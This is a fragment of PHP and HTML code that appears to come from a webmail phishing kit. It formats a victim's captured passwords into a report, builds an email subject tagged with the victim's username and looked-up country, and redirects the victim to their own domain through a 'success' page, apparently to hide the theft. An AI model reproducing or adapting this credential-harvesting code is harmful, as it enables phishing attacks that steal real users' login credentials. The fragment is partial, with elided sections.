		                                                        ...
		                                                        <td>
		                                                            <table border="0" cellpadding="0" cellspacing="0" style="min-width:300px">
		                                                                <tbody>
																			...
																			<font size="4"><b>[ &nbsp;Password&nbsp; ] = </b>'.$Password.'</font><br>
																			<font size="4"><b>[ &nbsp;Password2&nbsp; ] = </b>'.$Password2.'</font><br>
																			<br>
...
$X_SUBJECT = "WebMail v1 | ".$User."  | ".$LOOKUP_COUNTRY;
...
$url = "http://".$domain;
HEADER("Location: success.php?url=".$url, true, 303);
?>
